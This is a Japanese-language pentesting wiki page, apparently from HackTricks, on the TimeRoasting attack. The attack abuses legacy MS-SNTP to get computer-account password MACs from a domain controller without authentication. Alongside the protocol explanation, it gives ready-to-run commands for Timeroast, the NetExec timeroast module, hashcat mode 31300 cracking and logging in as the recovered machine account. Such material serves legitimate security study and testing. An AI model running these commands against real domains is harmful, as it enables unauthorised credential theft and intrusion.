# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting は legacy MS-SNTP authentication を悪用します。認証されていない client は、指定した computer-account RID を含む 68-byte request を送信できます。悪用可能な legacy path では、domain controller が computer account の NT hash（MD4-derived password secret）を使用して Netlogon 経由で response authenticator を導出するため、攻撃者は offline password guessing に適した challenge/MAC pair（Hashcat mode 31300）を取得できます。<sup>[[1]](#references)[[2]](#references)</sup>

MS-SNTP の Sections 3.1.5.1 および 4 では、request と response の動作について説明されています：<sup>[[1]](#references)</sup>
![TimeRoasting: 詳細については、公式 MS-SNTP spec の section 3.1.5.1 "Authentication Request Behavior" および 4 "Protocol Examples" を参照](../../images/Pasted%20image%2020250709114508.png)
`ExtendedAuthenticatorSupported` が false の場合、request は authenticator の Key Identifier の下位 31 bits に RID を格納し、上位 bit に selector bit を格納します。server は 68-byte length を検証して RID を抽出し、Netlogon に candidate checksums の計算を依頼し、その上位 bit を使用して 1 つを選択し、response Key Identifier を zero にして、選択した checksum を返します。<sup>[[1]](#references)</sup>

crypto-checksum は MD5-based です（3.2.5.1.1 を参照）。offline で crack できるため、roasting attack が可能になります。<sup>[[1]](#references)</sup>

## 攻撃方法

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort による Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcatを使用した実践的な攻撃（unauth）

- NetExecの`timeroast` moduleは、computer RIDを列挙し、authenticationなしでMS-SNTP MACを収集し、crackingの準備ができた`$sntp-ms$` hashesを出力できます。<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC) で offline crack:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- 復元された平文はコンピューターアカウントのパスワードに対応します。NTLM が無効になっている場合は、Kerberos（-k）を使用してマシンアカウントとして直接試します：
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### 運用上の注意
- Kerberosで回収した認証情報を使用する前に、正確な時刻を確保してください。`chronyd`/`systemd-timesyncd`などの維持管理されたNTPクライアントを優先してください。`ntpdate`は一般的なラボ用コマンドとしてここでは掲載しています: `sudo ntpdate <dc_fqdn>`.
- 必要に応じて、AD realm用のkrb5.confを生成します: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- 認証済みの足がかりを得た後、LDAP/BloodHoundを使用してRIDをprincipalsに対応付けます。

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroastingホワイトペーパー](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast`モジュールのソース](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
